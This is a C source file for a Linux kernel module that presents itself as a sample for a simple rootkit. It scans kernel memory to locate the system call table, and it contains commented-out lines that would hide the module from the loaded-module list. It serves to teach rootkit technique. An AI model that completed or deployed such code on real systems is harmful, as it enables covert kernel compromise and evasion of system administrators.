/*
 * sys_call_hijack.c - sample for a simple LKM rootkit
 *
 * Copyright (C) 2015 Max Schrimpf. Based on a tutorial by Tyler Borland.
 *
 *This project is free software: You can redistribute it and/or 
 * modify it under the terms of the European Union Public Licence (EUPL v.1.1) 
 * or – as soon they will be approved by the European 
 * Commission - subsequent versions of the EUPL (the "Licence"); 
 * You may not use this work except in compliance with the Licence.
 * 
 * The project is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
 * Licence for the specific language governing permissions and 
 * limitations under the Licence.
 *
 * You should have received a copy of the GNU General Public License
 * along with this project; if not, see <http://ec.europa.eu/idabc/eupl.html>.
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}
// Kernel live patch 
//#include <linux/livepatch.h>


int hijack_init(void) {
  //  list_del_init(&__this_module.list);
  //  kobject_del(&THIS_MODULE->mkobj.kobj);


  if (sys_call_table = (psize *) find()) {
    printk("hijack: sys_call_table found at %p\n",sys_call_table);
  } else {
    printk("hijack: sys_call_table not found\n");
  }
  printk("hijack: LKM loaded\n");
  return 0;
}

void hijack_exit(void) {
  printk("hijack: LKM removed\n");
}

MODULE_LICENSE("EUPL");
MODULE_AUTHOR("Max Schrimpf");
MODULE_DESCRIPTION("Syscall hijacking by a rootkit example");
module_init(hijack_init);
module_exit(hijack_exit);
